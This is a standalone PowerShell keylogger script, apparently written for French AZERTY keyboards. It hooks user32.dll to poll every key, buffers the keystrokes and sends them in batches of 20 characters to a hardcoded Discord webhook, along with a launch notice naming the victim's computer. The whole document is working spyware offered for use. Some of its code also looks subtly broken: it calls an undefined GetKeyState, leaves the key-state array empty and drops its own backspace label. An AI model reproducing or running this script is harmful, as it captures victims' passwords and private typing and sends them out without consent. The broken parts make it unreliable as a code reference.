$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif AZERTY lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyState, StringBuilder buff, int buffSize, uint flags);
}
'@

$buffer = ''
while ($true) {
    Start-Sleep -Milliseconds 30

    for ($i = 8; $i -le 254; $i++) {
        if ([K]::GetAsyncKeyState($i) -eq -32767) {
            $sb = New-Object Text.StringBuilder
            $state = New-Object byte[] 256
            GetKeyState(0x10) # Shift
            [K]::ToUnicode($i, 0, $state, $sb, $sb.Capacity, 0) | Out-Null
            $char = $sb.ToString()
            if ($char.Length -eq 0) {
                switch ($i) {
                    8  { $char = '[BACKSPACE]' }
                    13 { $char = "`n" }
                    32 { $char = ' ' }
                    default { $char = '' }
                }
            }
            if ($i -ne 8) { $buffer += $char }

            if ($buffer.Length -ge 20) {
                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buffer = ''
            }
        }
    }
}
